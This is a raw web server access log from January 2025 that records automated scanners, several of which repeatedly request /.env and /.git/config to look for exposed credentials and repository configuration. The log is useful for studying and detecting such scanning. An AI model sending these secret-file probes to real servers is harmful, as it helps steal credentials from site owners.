157.66.55.50 - - [15/Jan/2025:13:58:05 +0000] "GET /.git/config HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
157.66.55.50 - - [15/Jan/2025:13:58:07 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
121.173.210.69 - - [15/Jan/2025:14:01:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [15/Jan/2025:14:18:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:14:18:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:14:20:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:14:20:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:14:28:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:14:28:46 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:14:39:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
66.240.236.116 - - [15/Jan/2025:14:40:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.146 - - [15/Jan/2025:15:14:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [15/Jan/2025:15:18:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:15:18:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:16:04:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:16:04:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.215.236.132 - - [15/Jan/2025:16:05:33 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 6.0.1; OPPO A57 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044813 Mobile Safari/537.36 MMWEBID/6886 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN"
18.216.4.246 - - [15/Jan/2025:16:24:41 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.216.4.246 - - [15/Jan/2025:16:25:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:16:35:58 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
